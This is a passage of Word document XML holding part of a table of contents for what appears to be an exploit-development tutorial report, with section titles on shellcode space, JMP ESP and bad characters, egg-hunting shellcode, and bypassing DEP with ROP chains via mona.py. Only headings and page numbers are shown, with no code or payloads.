                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Calculating Shellcode Space</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326461 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="622C42C8" w14:textId="314BE13E" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326462" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Finding a JMP ESP and Bad Character Testing</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326462 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="570ACF7E" w14:textId="66A0C994" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326463" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Generating and adding Simple Shellcode</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326463 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="54C6F0A2" w14:textId="540B4E10" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326464" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.6</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Advanced Payload</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326464 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F0A6B36" w14:textId="6E55DEA2" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326465" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.7</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Egg-hunting Shellcode</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326465 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7DBFFA30" w14:textId="65E96A93" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326466" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tutorial 2 – Overcoming DEP with ROP Chains</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326466 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="48EE0224" w14:textId="1C0AB43E" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326467" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.6.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>ROP Chains</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326467 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6DD4FEE9" w14:textId="6ACA7B5C" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326468" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.6.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Creating the ROP chains with mona.py</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326468 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1F4416B3" w14:textId="57B1FF96" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326469" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.6.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Creating the payload</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326469 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="122793CB" w14:textId="70E9E43E" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326470" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Discussion</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326470 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="135D8028" w14:textId="1E06FAF1" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326471" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>3.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>General Discussion</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326471 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="050A34DC" w14:textId="3D014226" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326472" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>3.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
